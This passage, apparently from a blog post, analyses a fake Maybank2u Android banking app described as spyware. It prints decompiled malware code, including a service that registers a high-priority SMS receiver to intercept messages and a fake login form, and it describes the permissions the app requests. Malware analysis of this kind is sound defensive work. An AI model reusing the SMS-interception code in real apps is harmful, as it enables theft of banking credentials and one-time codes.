</span></span><span style="display:flex;"><span>    String locale <span style="color:#f92672">=</span> Locale.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> hashCode3 <span style="color:#f92672">=</span> locale.<span style="color:#a6e22e">hashCode</span>();
</span></span><span style="display:flex;"><span>    String str2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Ruxsatlar talab qilinadi&#34;</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on what I understand from the code, this is checking if the <code>isFirstRun</code> value is true or not in shared preferences. If the condition is met, it will request permission for the application and allow the application to work as intended. Something interesting is it uses <code>Ruxsatlar talab qilinadi</code> which is Uzbek and <code>Разрешить</code> which is Russian words aside from English.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-1">1</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>N8.<span style="color:#a6e22e">a</span>(<span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">new</span> O8(<span style="color:#f92672">-</span>425911099, <span style="color:#66d9ef">new</span> Bn(<span style="color:#66d9ef">this</span>, i), <span style="color:#66d9ef">true</span>));
</span></span></code></pre></td></tr></table>
</div>
</div><p>If I did not meet the condition mentioned above, the application will instead start this <code>a</code> function which seems like some other kind of interface.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-1">1</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>startService(<span style="color:#66d9ef">new</span> Intent(<span style="color:#66d9ef">this</span>, (Class<span style="color:#f92672">&lt;?&gt;</span>) MgRKn55kcebb482e4b514772964e31012d0b1157.<span style="color:#a6e22e">class</span>));
</span></span></code></pre></td></tr></table>
</div>
</div><p>One more things that I noticed is on the end of the <code>onCreate</code> function, there&rsquo;s this <code>startService</code> function which send intent to the class.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-14">14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-15">15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-16">16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-17">17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-18">18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-19">19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-20">20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-21">21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-22">22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-23">23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-24">24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-25">25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-26">26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-27">27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-28">28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-29">29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-30">30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-31">31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-32">32</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MgRKn55kcebb482e4b514772964e31012d0b1157</span> <span style="color:#66d9ef">extends</span> Service {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> RE Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> IBinder <span style="color:#a6e22e">GZhJfnKSd3bcf0449614b4f9f971198a1927183cd</span>(Intent intent) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">L3SIZ9rLe3f0e2e3fd01496286efcad0fda547f6</span>(Intent intent, <span style="color:#66d9ef">int</span> i, <span style="color:#66d9ef">int</span> i2) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RE();
</span></span><span style="display:flex;"><span>        IntentFilter intentFilter <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> IntentFilter();
</span></span><span style="display:flex;"><span>        intentFilter.<span style="color:#a6e22e">setPriority</span>(1000);
</span></span><span style="display:flex;"><span>        intentFilter.<span style="color:#a6e22e">addAction</span>(<span style="color:#e6db74">&#34;android.provider.Telephony.SMS_RECEIVED&#34;</span>);
</span></span><span style="display:flex;"><span>        RE re <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (re <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            registerReceiver(re, intentFilter);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> 2;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        AbstractC0641jk.<span style="color:#a6e22e">U</span>(<span style="color:#e6db74">&#34;receiver&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// android.app.Service</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onDestroy</span>() {
</span></span><span style="display:flex;"><span>        RE re <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">Tj0TVE0Hb5c3ac3785e6455cb344fca21faf691b</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (re <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            AbstractC0641jk.<span style="color:#a6e22e">U</span>(<span style="color:#e6db74">&#34;receiver&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        unregisterReceiver(re);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">onDestroy</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>This class looks like a service that will trigger the broadcast receiver <code>onReceive</code> function to receive SMS messages. Aside from that, I really have no idea at the moment and decided to perform dynamic analysis</p>
<h3 id="dynamic-analysis">Dynamic Analysis<a hidden class="anchor" aria-hidden="true" href="#dynamic-analysis">#</a></h3>
<p>I started out by installing the malicious APK into my emulator.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index.png#center"></p>
<p>I then start to play around with the application.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-1.png#center"></p>
<p>It does requesting permission, let see what permission it is asking.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-2.png#center">
<img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-3.png#center">
<img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-4.png#center">
<img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-5.png#center"></p>
<p>It is requesting permission for contact, phone calls, SMS and running in background. These permissions are dangerous and should not be allowed especially when the APK is suspicious. But since I am performing analysis, I will need to provide these permissions in order to understand the application.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-6.png#center"></p>
<p>Looking into the first page, It is a login page which asked for username and password. I then tried to have a look at the code which have the keywords of <code>username</code>, <code>password</code>, <code>login</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-14">14</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> Object <span style="color:#a6e22e">c</span>() {
</span></span><span style="display:flex;"><span>    MainActivity mainActivity;
</span></span><span style="display:flex;"><span>    Uo uo <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">g</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>((Boolean) uo.<span style="color:#a6e22e">getValue</span>()).<span style="color:#a6e22e">booleanValue</span>()) {
</span></span><span style="display:flex;"><span>        Uo uo2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">h</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> ((String) uo2.<span style="color:#a6e22e">getValue</span>()).<span style="color:#a6e22e">length</span>();
</span></span><span style="display:flex;"><span>        Uo uo3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (length <span style="color:#f92672">&lt;</span> 6) {
</span></span><span style="display:flex;"><span>            uo3.<span style="color:#a6e22e">setValue</span>(<span style="color:#e6db74">&#34;Input Username between 6 and 16 characters.&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            Uo uo4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">j</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((String) uo4.<span style="color:#a6e22e">getValue</span>()).<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&lt;</span> 6) {
</span></span><span style="display:flex;"><span>                uo3.<span style="color:#a6e22e">setValue</span>(<span style="color:#e6db74">&#34;Invalid username/password.&#34;</span>);
</span></span><span style="display:flex;"><span>            } 
</span></span></code></pre></td></tr></table>
</div>
</div><p>I found one that looks interesting which it checks if the input and will provide some feedback if the input is 6 or lower.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-7.png#center">
<img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-8.png#center"></p>
<p>Look&rsquo;s like the code is for username and password length. If both of the input meet the requirement of 7 characters and above, it will perform something which has very long code.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-14">14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-15">15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-16">16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-17">17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-18">18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-19">19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-20">20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-21">21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-22">22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-23">23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-24">24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-25">25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-26">26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-27">27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-28">28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-29">29</a>
